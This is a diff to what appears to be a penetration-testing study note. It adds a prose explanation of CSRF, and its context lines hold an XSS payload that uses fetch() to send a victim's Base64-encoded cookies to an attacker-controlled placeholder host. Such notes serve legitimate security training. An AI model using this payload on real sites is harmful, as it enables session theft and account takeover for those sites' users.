@@ -124,6 +124,17 @@ In this case the cookie is a Base64 value because of the `btoa()` function. Deco
 
 *Note: We don't necessarily have to use the window.location() object that causes victims to get redirected. We can use fetch(), which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way. E.g. we can use a similar payload: `script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>`*
 
+## Cross-Site Request Forgery (CSRF or XSRF)
+
+Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated.
+
+A web application is vulnerable to CSRF attacks when:
+- All the parameters required for the targeted request can be determined or guessed by the attacker
+- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
+
+To successfully exploit a CSRF vulnerability, we need:
+- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
+- The victim to be logged into the application at the time when the malicious cross-site request is issued
 
 
 
